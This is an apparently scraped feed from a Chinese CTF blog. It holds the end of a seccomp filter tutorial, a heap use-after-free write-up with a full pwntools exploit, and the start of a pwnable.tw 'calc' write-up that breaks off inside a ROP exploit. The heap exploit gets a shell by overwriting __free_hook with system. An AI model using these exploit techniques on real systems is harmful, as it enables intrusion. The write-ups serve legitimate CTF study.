#<span class="number">0xc000003e</span>, bad    <span class="comment">/* AUDIT_ARCH_X86_64 */</span></span><br><span class="line">ld [<span class="number">0</span>]                  <span class="comment">/* offsetof(struct seccomp_data, nr) */</span></span><br><span class="line">jge #<span class="number">0x40000000</span>,bad</span><br><span class="line">  </span><br><span class="line">jeq #<span class="number">2</span>, bad             <span class="comment">/* open */</span></span><br><span class="line">jeq #<span class="number">257</span>, bad           <span class="comment">/* openat */</span></span><br><span class="line">jeq #<span class="number">59</span>, bad            <span class="comment">/* execve */</span></span><br><span class="line">jeq #<span class="number">322</span>, bad           <span class="comment">/* execveat */</span></span><br><span class="line"></span><br><span class="line">good: ret #<span class="number">0x7fff0000</span>   <span class="comment">/* SECCOMP_RET_ALLOW */</span></span><br><span class="line">bad: ret #<span class="number">0x80000000</span>    <span class="comment">/* SECCOMP_RET_KILL_PROCESS */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>之后用bpf_asm(linux的tool或者python的模块)生成C语言数组:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3  -m bpf_asm -c seccomp_rules.bpf</span><br></pre></td></tr></table></figure><p>生成的数组是这样子的;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sb@sb-virtual-machine:~/Desktop$ python3 -m bpf_asm -c ./seccomp_rule.bpf</span><br><span class="line">&#123; 0x20, 0, 0, 0x00000004 &#125;,</span><br><span class="line">&#123; 0x15, 0, 7, 0xc000003e &#125;,</span><br><span class="line">&#123; 0x20, 0, 0, 0x00000000 &#125;,</span><br><span class="line">&#123; 0x35, 5, 0, 0x40000000 &#125;,</span><br><span class="line">&#123; 0x15, 4, 0, 0x00000002 &#125;,</span><br><span class="line">&#123; 0x15, 3, 0, 0x00000101 &#125;,</span><br><span class="line">&#123; 0x15, 2, 0, 0x0000003b &#125;,</span><br><span class="line">&#123; 0x15, 1, 0, 0x00000142 &#125;,</span><br><span class="line">&#123; 0x6, 0, 0, 0x7fff0000 &#125;,</span><br><span class="line">&#123; 0x6, 0, 0, 0x80000000 &#125;,</span><br></pre></td></tr></table></figure><p>拷贝到C语言代码里面:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">sock_filter</span> <span class="title">filters</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">   &#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000004</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0xc000003e</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x35</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0x40000000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x00000002</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0x00000101</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x0000003b</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x00000142</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x7fff0000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80000000</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">fprog</span> =</span> &#123;</span><br><span class="line">   .filter = filters,</span><br><span class="line">   .len = <span class="keyword">sizeof</span>(filters) / <span class="keyword">sizeof</span>(filters[<span class="number">0</span>])</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>之后用prctl或者seccomp 系统调用就可以开启了:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp(SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;fprog);</span><br></pre></td></tr></table></figure><p>如果失败的话，使用 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>原因:</p><blockquote><p>In order to use the SECCOMP_SET_MODE_FILTER operation, either the calling thread must have the CAP_SYS_ADMIN  capability  in its  user namespace, or the thread must already have the no_new_privs bit set.  If that bit was not already set by an ancestor of this thread, the thread must make the following call:</p><p>prctl(PR_SET_NO_NEW_PRIVS, 1);</p><p>Otherwise, the SECCOMP_SET_MODE_FILTER operation fails and returns EACCES in errno.  This requirement ensures  that  an  un‐privileged  process  cannot  apply  a  malicious(恶意的)  filter and then invoke a set-user-ID or other privileged program using execve(2), thus potentially compromising that program.  (Such a malicious filter might, for example, cause an attempt  to  use setuid(2) to set the caller’s user IDs to nonzero values to instead return 0 without actually making the system call.  Thus,the program might be tricked into retaining superuser privileges in circumstances where it is possible to influence it to do dangerous things because it did not actually drop privileges.)</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;seccomp-filter&quot;&gt;&lt;a href=&quot;#seccomp-filter&quot; class=&quot;headerlink&quot; title=&quot;seccomp filter&quot;&gt;&lt;/a&gt;seccomp filter&lt;/h1&gt;&lt;p&gt;这个东西是能自定义过滤掉一些系统调用，应该是</summary>
      
    
    
    
    <category term="linux" scheme="https://h4ckf0rfun.github.io/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>UAF而不是double free - DAS10月总结</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/</id>
    <published>2022-10-24T11:15:33.000Z</published>
    <updated>2022-10-24T11:17:46.785Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%201.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%202.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%203.png" alt="Untitled"></p><p>常规的菜单题，只有add和free两种操作，并且还有一次backdoor的机会，在backdoor中，free后并没有将指针置为0，导致了UAF 漏洞</p><p>还是没有懂得UAF的真谛，一看到这个就想到了double free来利用，但是由于add次数限制，最后也没有想出来。今天上课时才忽然明白，并不是doule free利用。</p><p>UAF 的全程是use after free，即释放后在使用，这里backdoor里面free之后没有置为0，导致了之后我们仍然可以使用它。</p><p>既然已经被释放了，它里面的数据是无法确定的，也就是说，我想到的double free ,是假设它里面的内容没有变(准确的说是堆块的位置没有改变)，然后使某个堆块被分配出两次。但是实际上，free内的一系列操作，可能会改变堆块的位置，因为有合并操作。</p><p>在本题中，UAF 中的use 是指 再次进行free操作，此时的free有两种情况:</p><ol><li>double free 同一个chunk</li><li>free掉一个伪造的chunk</li></ol><p>double free这种利用方法在此题目malloc次数的限制下，是明显不行的。如果free掉一个伪造的chunk，可以造成堆块重叠，而且可以在限制的次数内成功exploit</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28301</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        add(<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">        free(<span class="number">8</span> - i);</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    backdoor(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,payload)       <span class="comment">#0x100, fake chunk.</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)          <span class="comment">##emmm.get left chunk </span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)                 <span class="comment">## overlapped chunk</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)      <span class="comment">###11</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)      <span class="comment">###12</span></span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="string">b&#x27;\xa0\x16&#x27;</span>)       <span class="comment">#13</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = p64(<span class="number">0x1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x08&#x27;</span></span><br><span class="line">    add(<span class="number">0x80</span>,payload)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout = <span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc.address &lt; <span class="number">0x7f0000000000</span> <span class="keyword">or</span> (libc.address &amp; <span class="number">0xfff</span>) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;libc.address error&#x27;</span>)</span><br><span class="line">    success(<span class="string">&#x27;libc:&#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28301</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        success(<span class="string">&#x27;pwn success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">11</span>)</span><br><span class="line">        free(<span class="number">10</span>)</span><br><span class="line">        free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0</span>))         <span class="comment">#payload</span></span><br><span class="line">        add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)                <span class="comment">#alloc to __free_hook..</span></span><br><span class="line">        add(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))   </span><br><span class="line">        <span class="comment">#get shell</span></span><br><span class="line">        free(<span class="number">17</span>)</span><br><span class="line">        success(<span class="string">&#x27;get shell!&#x27;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>总之，要认真体会UAF 的含义，不要被限制思维。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled.png&quot; alt=&quot;Untitled&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:/</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnable.tw-calc</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/</id>
    <published>2022-10-20T15:49:43.000Z</published>
    <updated>2022-10-24T11:24:24.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/Untitled.png" alt="Untitled"></p><p>题目是一个简易的计算器程序，只能进行 + ,- ,* ,&#x2F; , % ,而且没有括号。并且有两个栈，一个符号栈，一个数字栈。数字栈的第一个元素用来保存top。</p><p>parse_expr函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">char</span> *expr, _DWORD *NumStack)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> top; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *num_start; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> OptTop; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> *num_str_len; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *num; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> OptStack[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"></span><br><span class="line">  num_start = expr;</span><br><span class="line">  OptTop = <span class="number">0</span>;</span><br><span class="line">  bzero(OptStack, <span class="number">0x64</span>u);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( expr[i] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )      <span class="comment">// 不是数字,读到符号了</span></span><br><span class="line">    &#123;</span><br><span class="line">      num_str_len = (<span class="type">char</span> *)(&amp;expr[i] - num_start);</span><br><span class="line">      num = (<span class="type">char</span> *)<span class="built_in">malloc</span>(num_str_len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(num, num_start, num_str_len);</span><br><span class="line"></span><br><span class="line">      num[(_DWORD)num_str_len] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(num, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(num);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">      &#123;</span><br><span class="line">        top = (*NumStack)++;</span><br><span class="line">        NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( expr[i] &amp;&amp; expr[i + <span class="number">1</span>] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )<span class="comment">// 遇到一个运算符,但是运算符后面不是数字</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num_start = &amp;expr[i + <span class="number">1</span>];                 <span class="comment">// 取第二个数字</span></span><br><span class="line">      <span class="keyword">if</span> ( OptStack[OptTop] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( expr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( OptStack[OptTop] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; OptStack[OptTop] != <span class="string">&#x27;-&#x27;</span> )<span class="comment">// 从左到有依次计算</span></span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            OptStack[++OptTop] = expr[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(NumStack, OptStack[OptTop]);   <span class="comment">// 计算前面的结果</span></span><br><span class="line">            OptStack[OptTop] = expr[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(NumStack, OptStack[OptTop--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        OptStack[OptTop] = expr[i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !expr[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( OptTop &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(NumStack, OptStack[OptTop--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要比一般的计算表达式的程序简单很多。</p><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h1><p>这个题目里面只有正数，没有负数。也就是说数字前面不能带正负号。当输入的第一个字符为运算符的时候，看这行代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = atoi(num);</span><br><span class="line"><span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">&#123;</span><br><span class="line">  top = (*NumStack)++;</span><br><span class="line">  NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时num &#x3D; ‘\x00’，atoi会返回一个0，那么它就不会压栈。这样只会计算的时候，就会导致top 少1，这样的话就会把数字栈的第一个元素，也就是top，也会参与到运算中。只要控制top 为合适的值，之后就可以实现任意地址写。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式:"></a>利用方式:</h1><p>由于优先级的问题，导致数字栈内不可能push 太多的数字，但是可以计算多个表达式，所以只要在一个表达式内写一个值就行，利用下面这里的代码实现任意地址写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = atoi(num);</span><br><span class="line"><span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">&#123;</span><br><span class="line">  top = (*NumStack)++;</span><br><span class="line">  NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(通过运算来写值的话太麻烦了，直接利用push 来写，为了防止数据被覆盖，在修改掉top后push 一个值即可)</p><p>流程:</p><ol><li>修改top到合适位置</li><li>push val写rop</li></ol><h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span> <span class="comment">#: pop eax ; ret</span></span><br><span 